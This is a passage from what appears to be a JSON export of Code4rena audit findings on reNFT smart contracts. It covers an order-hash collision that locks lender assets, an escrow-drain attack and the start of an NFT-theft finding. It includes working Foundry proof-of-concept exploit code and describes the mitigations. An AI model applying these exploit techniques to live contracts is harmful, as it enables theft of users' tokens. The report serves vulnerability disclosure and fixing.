});\n+\n+        // for each new offer item being rented, create a new item struct to add to the rental order\n+        for (uint256 i = 0; i < parameters.offer.length; i++) {\n+            // PAYEE orders cannot have offer items\n+            require(\n+                metadata.orderType != OrderType.PAYEE,\n+                \"TEST: cannot have offer items in PAYEE order\"\n+            );\n+\n+            // get the offer item\n+            OfferItem memory offerItem = parameters.offer[i];\n+\n+            // determine the item type\n+            ItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n+\n+            // determine which entity the payment will settle to\n+            SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n+                ? SettleTo.RENTER\n+                : SettleTo.LENDER;\n+\n+            // create a new rental item\n+            rentalOrder.items[i] = Item({\n+                itemType: itemType,\n+                settleTo: settleTo,\n+                token: offerItem.token,\n+                amount: offerItem.startAmount / 2,\n+                identifier: offerItem.identifierOrCriteria\n+            });\n+        }\n+\n+        // for each consideration item in return, create a new item struct to add to the rental order\n+        for (uint256 i = 0; i < parameters.consideration.length; i++) {\n+            // PAY orders cannot have consideration items\n+            require(\n+                metadata.orderType != OrderType.PAY,\n+                \"TEST: cannot have consideration items in PAY order\"\n+            );\n+\n+            // get the offer item\n+            ConsiderationItem memory considerationItem = parameters.consideration[i];\n+\n+            // determine the item type\n+            ItemType itemType = _seaportItemTypeToRentalItemType(\n+                considerationItem.itemType\n+            );\n+\n+            // determine which entity the payment will settle to\n+            SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n+                considerationItem.itemType == SeaportItemType.ERC20\n+                ? SettleTo.RENTER\n+                : SettleTo.LENDER;\n+\n+            // calculate item index offset\n+            uint256 itemIndex = i + parameters.offer.length;\n+\n+            // create a new payment item\n+            rentalOrder.items[itemIndex] = Item({\n+                itemType: itemType,\n+                settleTo: settleTo,\n+                token: considerationItem.token,\n+                amount: considerationItem.startAmount,\n+                identifier: considerationItem.identifierOrCriteria\n+            });\n+        }\n+    }\n+\n     function _signProtocolOrder(\n         uint256 signerPrivateKey,\n         bytes32 payloadHash\n@@ -526,20 +664,73 @@ contract OrderFulfiller is OrderCreator {\n         }\n         // otherwise, expect the relevant event to be emitted.\n         else {\n-            vm.expectEmit({emitter: address(create)});\n-            emit Events.RentalOrderStarted(\n-                create.getRentalOrderHash(payRentalOrder),\n-                payOrder.payload.metadata.emittedExtraData,\n-                payRentalOrder.seaportOrderHash,\n-                payRentalOrder.items,\n-                payRentalOrder.hooks,\n-                payRentalOrder.orderType,\n-                payRentalOrder.lender,\n-                payRentalOrder.renter,\n-                payRentalOrder.rentalWallet,\n-                payRentalOrder.startTimestamp,\n-                payRentalOrder.endTimestamp\n-            );\n+            // vm.expectEmit({emitter: address(create)});\n+            // emit Events.RentalOrderStarted(\n+            //     create.getRentalOrderHash(payRentalOrder),\n+            //     payOrder.payload.metadata.emittedExtraData,\n+            //     payRentalOrder.seaportOrderHash,\n+            //     payRentalOrder.items,\n+            //     payRentalOrder.hooks,\n+            //     payRentalOrder.orderType,\n+            //     payRentalOrder.lender,\n+            //     payRentalOrder.renter,\n+            //     payRentalOrder.rentalWallet,\n+            //     payRentalOrder.startTimestamp,\n+            //     payRentalOrder.endTimestamp\n+            // );\n+        }\n+\n+        // the offerer of the PAYEE order fulfills the orders.\n+        vm.prank(fulfiller.addr);\n+\n+        // fulfill the orders\n+        seaport.matchAdvancedOrders(\n+            _deconstructOrdersToFulfill(),\n+            new CriteriaResolver[](0),\n+            seaportMatchOrderFulfillments,\n+            seaportRecipient\n+        );\n+\n+        // clear structs\n+        resetFulfiller();\n+        resetOrdersToFulfill();\n+        resetSeaportMatchOrderFulfillments();\n+    }\n+\n+    function _finalizePayOrderFulfillmentPartial(\n+        bytes memory expectedError\n+    )\n+        private\n+        returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n+    {\n+        // get the orders to fulfill\n+        OrderToFulfill memory payOrder = ordersToFulfill[0];\n+        OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n+\n+        // create rental orders\n+        payRentalOrder = _createRentalOrderPartial(payOrder);\n+        payeeRentalOrder = _createRentalOrder(payeeOrder);\n+\n+        // expect an error if error data was provided\n+        if (expectedError.length != 0) {\n+            vm.expectRevert(expectedError);\n+        }\n+        // otherwise, expect the relevant event to be emitted.\n+        else {\n+            // vm.expectEmit({emitter: address(create)});\n+            // emit Events.RentalOrderStarted(\n+            //     create.getRentalOrderHash(payRentalOrder),\n+            //     payOrder.payload.metadata.emittedExtraData,\n+            //     payRentalOrder.seaportOrderHash,\n+            //     payRentalOrder.items,\n+            //     payRentalOrder.hooks,\n+            //     payRentalOrder.orderType,\n+            //     payRentalOrder.lender,\n+            //     payRentalOrder.renter,\n+            //     payRentalOrder.rentalWallet,\n+            //     payRentalOrder.startTimestamp,\n+            //     payRentalOrder.endTimestamp\n+            // );\n         }\n \n         // the offerer of the PAYEE order fulfills the orders.\n@@ -566,6 +757,13 @@ contract OrderFulfiller is OrderCreator {\n         (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n     }\n \n+    function finalizePayOrderFulfillmentPartial()\n+    internal\n+    returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n+{\n+    (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillmentPartial(bytes(\"\"));\n+}\n+\n     function finalizePayOrderFulfillmentWithError(\n         bytes memory expectedError\n     )\ndiff --git a/test/integration/Rent.t.sol b/test/integration/Rent.t.sol\nindex 6c4c8d3..f20b299 100644\n--- a/test/integration/Rent.t.sol\n+++ b/test/integration/Rent.t.sol\n@@ -13,6 +13,7 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n \n import {BaseTest} from \"@test/BaseTest.sol\";\n import {ProtocolAccount} from \"@test/utils/Types.sol\";\n+import \"@forge-std/console.sol\";\n \n contract TestRent is BaseTest {\n     function test_Success_Rent_BaseOrder_ERC721() public {\n@@ -276,6 +277,135 @@ contract TestRent is BaseTest {\n         assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n     }\n \n+    function test_Success_Rent_PayOrder_Partial() public {\n+        // create a PAY order\n+        createOrder({\n+            offerer: alice,\n+            orderType: OrderType.PAY,\n+            erc721Offers: 0,\n+            erc1155Offers: 2,\n+            erc20Offers: 1,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 0,\n+            erc20Considerations: 0\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payOrder,\n+            bytes32 payOrderHash,\n+            OrderMetadata memory payOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create a PAYEE order. The fulfiller will be the offerer.\n+        createOrder({\n+            offerer: bob,\n+            orderType: OrderType.PAYEE,\n+            erc721Offers: 0,\n+            erc1155Offers: 0,\n+            erc20Offers: 0,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 2,\n+            erc20Considerations: 1\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payeeOrder,\n+            bytes32 payeeOrderHash,\n+            OrderMetadata memory payeeOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            RentalOrder memory payRentalOrder,\n+            RentalOrder memory payeeRentalOrder\n+        ) = finalizePayOrderFulfillment();\n+\n+\n+        // get the rental order hashes\n+        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n+        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n+        console.log(\"first pay rental order : \");\n+        console.logBytes32(payRentalOrderHash);\n+        console.log(\"first payee rental order : \");\n+        console.logBytes32(payeeRentalOrderHash);\n+        // second time - my addition\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            payRentalOrder,\n+            payeeRentalOrder\n+        ) = finalizePayOrderFulfillment();\n+\n+        // get the rental order hashes\n+        payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n+        payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n+        console.log(\"second pay rental order : \");\n+        console.logBytes32(payRentalOrderHash);\n+        console.log(\"second payee rental order : \");\n+        console.logBytes32(payeeRentalOrderHash);\n+        // second time - end\n+\n+        // assert that the rental order was stored\n+        assertEq(STORE.orders(payRentalOrderHash), true);\n+\n+        // assert that the payee rental order was not put in storage\n+        assertEq(STORE.orders(payeeRentalOrderHash), false);\n+\n+        // assert that the token is in storage\n+        // assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n+\n+        // assert that the offerer made a payment\n+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));\n+\n+        // assert that a payment was made to the escrow contract\n+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n+\n+        // assert that a payment was synced properly in the escrow contract\n+        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n+\n+        // assert that the ERC721 is in the rental wallet of the fulfiller\n+        // assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n+    }\n+\n     // This test involves a PAY order where one of the items is left out of the PAYEE order.\n     // Instead, the fulfiller attempts to use the `recipient` input parameter on `matchAdvancedOrders`\n     // to try to send an asset to an unauthorized address\ndiff --git a/test/integration/StopRent.t.sol b/test/integration/StopRent.t.sol\nindex 3d19d3c..0cf67c2 100644\n--- a/test/integration/StopRent.t.sol\n+++ b/test/integration/StopRent.t.sol\n@@ -7,6 +7,8 @@ import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStruct\n \n import {BaseTest} from \"@test/BaseTest.sol\";\n \n+import \"@forge-std/console.sol\";\n+\n contract TestStopRent is BaseTest {\n     function test_StopRent_BaseOrder() public {\n         // create a BASE order\n@@ -245,6 +247,134 @@ contract TestStopRent is BaseTest {\n         assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n     }\n \n+    function test_stopRent_payOrder_inFull_stoppedByRenter_Partial() public {\n+        // create a PAY order\n+        createOrder({\n+            offerer: alice,\n+            orderType: OrderType.PAY,\n+            erc721Offers: 0,\n+            erc1155Offers: 2,\n+            erc20Offers: 1,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 0,\n+            erc20Considerations: 0\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payOrder,\n+            bytes32 payOrderHash,\n+            OrderMetadata memory payOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create a PAYEE order. The fulfiller will be the offerer.\n+        createOrder({\n+            offerer: bob,\n+            orderType: OrderType.PAYEE,\n+            erc721Offers: 0,\n+            erc1155Offers: 0,\n+            erc20Offers: 0,\n+            erc721Considerations: 0,\n+            erc1155Considerations: 2,\n+            erc20Considerations: 1\n+        });\n+\n+        // finalize the pay order creation\n+        (\n+            Order memory payeeOrder,\n+            bytes32 payeeOrderHash,\n+            OrderMetadata memory payeeOrderMetadata\n+        ) = finalizeOrder();\n+\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (RentalOrder memory payRentalOrderFirst, ) = finalizePayOrderFulfillmentPartial();\n+\n+        // get the rental order hashes\n+        bytes32 payRentalOrderHashFirst = create.getRentalOrderHash(payRentalOrderFirst);\n+        console.log(\"first pay rental order : \");\n+        console.logBytes32(payRentalOrderHashFirst);\n+        console.log(STORE.orders(payRentalOrderHashFirst));\n+        // second time - my addition\n+        // create an order fulfillment for the pay order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payOrder,\n+            orderHash: payOrderHash,\n+            metadata: payOrderMetadata\n+        });\n+\n+        // create an order fulfillment for the payee order\n+        createOrderFulfillmentPartial({\n+            _fulfiller: bob,\n+            order: payeeOrder,\n+            orderHash: payeeOrderHash,\n+            metadata: payeeOrderMetadata\n+        });\n+\n+        // add an amendment to include the seaport fulfillment structs\n+        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n+\n+        // finalize the order pay/payee order fulfillment\n+        (\n+            RentalOrder memory payRentalOrderFirstSecond,\n+        ) = finalizePayOrderFulfillmentPartial();\n+\n+        // get the rental order hashes\n+        console.log(\"second pay rental order : \");\n+        bytes32 payRentalOrderHashSecond = create.getRentalOrderHash(payRentalOrderFirstSecond);\n+        console.logBytes32(payRentalOrderHashSecond);\n+        console.log(STORE.orders(payRentalOrderHashSecond));\n+        // second time - end\n+\n+        // speed up in time past the rental expiration\n+        vm.warp(block.timestamp + 750);\n+\n+        // stop the rental order\n+        vm.prank(bob.addr);\n+        stop.stopRent(payRentalOrderFirst);\n+        vm.expectRevert();\n+        stop.stopRent(payRentalOrderFirstSecond);\n+\n+        // assert that the rental order doesnt exist in storage\n+        assertEq(STORE.orders(payRentalOrderHashFirst), false);\n+\n+        // assert that the token is still mark as rented due to amount still exist in storage\n+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[0]), 0), true);\n+        assertEq(STORE.isRentedOut(address(bob.safe), address(erc1155s[1]), 0), true);\n+\n+        // assert that the ERC1155 is back to alice only half of them\n+        assertEq(erc1155s[0].balanceOf(address(alice.addr), 0), uint256(50));\n+        assertEq(erc1155s[1].balanceOf(address(alice.addr), 0), uint256(50));\n+\n+        // assert that the offerer made a payment\n+        assertEq(erc20s[0].balanceOf(alice.addr), uint256(9900));\n+\n+        // assert that the fulfiller received the payment\n+        assertEq(erc20s[0].balanceOf(bob.addr), uint256(10050));\n+\n+        // assert that a payment was pulled from the escrow contract\n+        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(50));\n+    }\n+\n     function test_stopRent_payOrder_proRata_stoppedByLender() public {\n         // create a PAY order\n         createOrder({\n\n```\n\n</details>\n\nRun the test :\n\n```shell\nforge test -vv --match-contract TestStopRent --match-test test_stopRent_payOrder_inFull_stoppedByRenter_Partial\n```\n\nFrom the test, it can be observed that half of the lender's assets are locked, and the order cannot be stopped even after the rent duration has passed.\n\n### Recommended Mitigation Steps\n\nIntroduce nonce when calculating orderHash, to ensure every order will always unique.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/203#issuecomment-1908713503)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/10) - Prevents `RentPayload` replayability and ensures that orders must be unique by disallowing partial orders from seaport.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/8), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/47) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/36).\n\n***\n \n",
      "summary": "\nThe bug is that if a lender creates an offer set to partial, an attacker can lock parts of the lender's assets inside their own safe. This is because the order hash is calculated in a way that allows the attacker to create multiple similar orders, resulting in the same hash. This means that when the lender tries to stop the rental, they will only receive a portion of their assets back. The bug can be mitigated by introducing a nonce when calculating the order hash to ensure uniqueness. The reNFT team has confirmed and mitigated the bug by disallowing partial orders from the seaport. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/203",
      "tags": [],
      "finders": [
        "hash",
        "said",
        "fnanni"
      ]
    },
    {
      "id": "30526",
      "title": "[H-06] Escrow contract can be drained by creating rentals that bypass execution invariant checks",
      "impact": "HIGH",
      "content": "\n<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544> \n\n<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695>\n\nThe Escrow contract where ERC20 tokens are escrowed for payments can be completely drained.\n\n### Proof of Concept\n\nIt is possible to create rentals where no assets are transfered, but storage is still updated as normal. Then these fake rentals can be stopped to drain ERC20 tokens from the Escrow contract.\n\nThe `Create` contract [checks the expected receivers of ERC20 tokens and NFTs via `_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544).\n\nThis is to make sure that ERC20 tokens go to the Escrow contract, while NFTs go to the corresponding Safe wallet.\n\nThe key point of the attack is to fulfill an order, so that [the executions length is zero and no execution is checked](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695).\n\nThis is possible by making the offerer fulfill all the considerations within the same address of the offers.\n\nI'm assuming this is because of point 9 in the [Match Orders section of SeaPort Docs](https://docs.opensea.io/reference/seaport-overview#section-match-orders). Nevertheless, since SeaPort was forked, the coded POC still shows how the attack is possible.\n\n> 9.  Perform transfers as part of each execution\n>\n> *   Ignore each execution where \\`to == from\\`\\`\n\nTo put it in an example:\n\n1.  Carol signs a normal `PAY` rental order with an NFT + ERC20 tokens as an offer\n2.  Carol signs the malicious `PAYEE` counterpart order setting the recipient as her address (instead of the Safe for the NFT, and the ESCRW for the ERC20 tokens)\n3.  Carol matches those orders via the forked SeaPort\n4.  SeaPort calculates the `totalExecutions`, and since all offers and considerations are from the same address, there are no executions, as there will be no transfers\n5.  Both the `PAY` & `PAYEE` ordered are fulfilled and call `Create::validateOrder()`\n6.  No recipient checks are performed, since there are no executions\n7.  The `STORE` storage [will add the new rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595) for Carol, while [increasing the deposit amount in the Escrow](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L601)\n8.  SeaPort ends the order matching and fulfillment without performing any transfer\n9.  The rent can be stopped and it will drain the Escrow contract of any token + amount specified in the fake rent\n\nThe following POC proves how this is still possible with the forked SeaPort version and the current contracts.\n\nNote: For the sake of simplicity this POC:\n\n*   It [deals](https://book.getfoundry.sh/cheatcodes/deal?highlight=deal#deal) some ERC20 tokens to the Escrow contract to be stolen (instead of simulating another legit rental). It doesn't affect the outcome, as the tokens are stolen, regardless of whom they \"belong to\".\n*   It uses a fixture `carol.safe = SafeL2(payable(carol.addr));` just to make an ad-hoc replacement [for the ERC721 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.\n*   It uses a fixture `ESCRW = PaymentEscrow(carol.addr);` just to make an ad-hoc replacement [for the ERC20 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.\n\nCreate a new file with this test in `smart-contracts/test/integration/Drain.t.sol`:\n\n<Details>\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {\n    Order,\n    FulfillmentComponent,\n    Fulfillment,\n    ItemType as SeaportItemType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\nimport {BaseTest} from \"@test/BaseTest.sol\";\nimport {ProtocolAccount} from \"@test/utils/Types.sol\";\n\nimport {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\nimport {Safe} from \"@safe-contracts/Safe.sol\";\n\nimport {SafeL2} from \"@safe-contracts/SafeL2.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n\ncontract TestDrain is BaseTest {\n    function test_Drain_Escrow() public {\n        // create a legit PAY order\n        createOrder({\n            offerer: carol,\n            orderType: OrderType.PAY,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 1,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 0\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payOrder,\n            bytes32 payOrderHash,\n            OrderMetadata memory payOrderMetadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment for the pay order\n        createOrderFulfillment({\n            _fulfiller: carol,\n            order: payOrder,\n            orderHash: payOrderHash,\n            metadata: payOrderMetadata\n        });\n\n        // << Malicious order creation below >>\n\n        // fixtures to replace the ERC721 and ERC20 recipients in `createOrder()`\n        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213\n        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250\n        SafeL2 carolSafe = carol.safe;\n        PaymentEscrow tempESCRW = ESCRW;\n        carol.safe = SafeL2(payable(carol.addr));\n        ESCRW = PaymentEscrow(carol.addr);\n\n        // create a malicious PAYEE order.\n        // It will set the ERC721 and ERC20 recipients as Carol herself\n        createOrder({\n            offerer: carol,\n            orderType: OrderType.PAYEE,\n            erc721Offers: 0,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 1,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // reset fixtures\n        carol.safe = carolSafe;\n        ESCRW = tempESCRW;\n\n        // finalize the pay order creation\n        (\n            Order memory payeeOrder,\n            bytes32 payeeOrderHash,\n            OrderMetadata memory payeeOrderMetadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment for the payee order\n        createOrderFulfillment({\n            _fulfiller: carol,\n            order: payeeOrder,\n            orderHash: payeeOrderHash,\n            metadata: payeeOrderMetadata\n        });\n\n        // add an amendment to include the seaport fulfillment structs\n        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n\n        // Verify Carol's balances and the Escrow balance before the rental attack is performed\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n\n        // finalize the order pay/payee order fulfillment\n        (\n            RentalOrder memory payRentalOrder,\n            RentalOrder memory payeeRentalOrder\n        ) = finalizePayOrderFulfillment();\n\n        // << The first part of the attack was performed >>\n        // A new rental was created without any token transfers\n\n        // get the rental order hashes\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n\n        // assert that the rental order WAS STORED\n        assertEq(STORE.orders(payRentalOrderHash), true);\n\n        // assert that the token IS IN STORAGE\n        assertEq(STORE.isRentedOut(address(carol.safe), address(erc721s[0]), 0), true);\n\n        // assert that Carol DID NOT MAKE A PAYMENT (same balance as before)\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));\n\n        // assert that NO PAYMENT WAS MADE to the Escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n\n        // assert that a payment was synced ERRONEOUSLY in the escrow contract (as no payment was made)\n        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        // assert that the ERC721 IS STILL owned by Carol (it didn't go to the Safe wallet)\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n\n\n        // << The second part of the attack is performed >>\n\n        // speed up in time past the rental expiration\n        // it uses the default values, but an attacker would make the expiration as soon as possible\n        vm.warp(block.timestamp + 750);\n\n        // Transfer the NFT to the Safe, so that the rent stop succeeds while trying to transfer the NFT back\n        vm.prank(carol.addr);\n        erc721s[0].safeTransferFrom(carol.addr, address(carol.safe), 0);\n\n        // Deal some tokens to the Escrow to be stolen\n        // An attacker would first check the tokens balances of the Escrow contract and craft rents matching them\n        deal(address(erc20s[0]), address(ESCRW), 100);\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n        // stop the rental order\n        vm.prank(carol.addr);\n        stop.stopRent(payRentalOrder);\n\n        // Carol gets back her NFT, while stealing the ERC20 tokens from the Escrow\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10100));\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n\n        // The Escrow contract was drained\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nI would suggest to check that the corresponding offers / considerations are actually included in the `totalExecutions` and **completely fulfilled** with their **corresponding recipients**.\n\nAdding some notes for the protocol to understand the attack surface:\n\nThere are other scenarios possible not exposed on the POC. For example, fulfilling just the NFT as expected to the safe, and only performing the attack on the ERC20, leaving a `totalExecutions` length of 1 (the NFT).  This can be done with ERC1155 as well.\n\nAnother possibility would be to fulfill the orders with multiple other ones, which could generate extra phantom executions.\n\nAlso note, that it is possible to evoid fulfilling `PAYEE` orders via the zone (as noted on another issue I sent).\n\nAll that said regarding the current scope, it would also be recommended to give a second look to the forked SeaPort implementation implementing `totalExecutions` to check if there could be another related attack vector there.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/387#issuecomment-1910352735)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/7), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/46) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/35).\n\n***\n\n",
      "summary": "\nSummary:\nThe bug report discusses a vulnerability in the Escrow contract of the re-nft smart contracts. This vulnerability allows an attacker to drain ERC20 tokens from the Escrow contract by creating fake rentals and stopping them. The attack is possible due to a flaw in the validation process of orders, where no checks are performed if the execution length is zero. The report also provides a proof of concept and suggests mitigation steps to prevent this vulnerability. The re-nft team has confirmed and mitigated the issue by introducing an intermediary transfer on rental creation. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/387",
      "tags": [],
      "finders": [
        "3",
        "1",
        "juancito",
        "2"
      ]
    },
    {
      "id": "30525",
      "title": "[H-05] Malicious actor can steal any actively rented NFT and freeze the rental payments (of the affected rentals) in the `escrow` contract",
      "impact": "HIGH",
      "content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265-L302> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L313-L363>\n\nThe main exploit presented in this report takes advantage of multiple bugs. Some of these bugs on their own can be viewed as having their own \"lesser\" impacts. However, this report can be considered as my demonstration of the `greatest impact` for all the bugs described below:\n\n1.  The `stopRent`/`stopRentBatch` functions do not validate the existence of the supplied `RentalOrder` until after the lender is sent the specified NFT. Therefore, a non-existent `RentalOrder` can be supplied and then created during the callback to the lender (`onERC721Received/onERC1155Received`). (**Successful exploitation of this bug is dependent on the other bugs below**)\n2.  The signature digest signed by the protocol signer is predictable and not necessarily unique to a specific order. Therefore, a generic signature can be retrieved from theoretically any order (via the front-end) and can then be used arbitrarily (for multiple fulfillments) until `metadata.expiration > block.timestamp`. This enables the above bug to be utilized, as a required signature is able to be retrieved beforehand so that the order creation and fulfillment process can be executed atomically for multiple orders. (**Successful exploitation of this bug is not dependent on the other bugs mentioned**)\n3.  Several core functions in `Signer.sol` are not compliant with EIP-712. This can be leveraged with the above bugs to obtain a valid signature and use this signature with multiple orders that have different `metadata.orderType` values. This also allows arbitrary `safe wallet` addresses to be included in the `RentalOrder` struct supplied to the `stop` functions. (**Successful exploitation of this bug is not dependent on the other bugs mentioned**)\n\nCombined, the above vulnerabilities allow the theft and freezing of any and/or all NFTs currently being rented out (active or expired, as long as the rental has not been stopped). The rental payments for the affected rentals will also be frozen in the `escrow` contract. The outline of this `Bug Description` section will be as follows:\n\n1.  The main exploit path will be discussed\n2.  Prerequisites for the main exploit will be discussed\n3.  Lesser, independently achievable, impacts of the independent vulnerabilities (2 & 3) will be briefly explained\n\n### 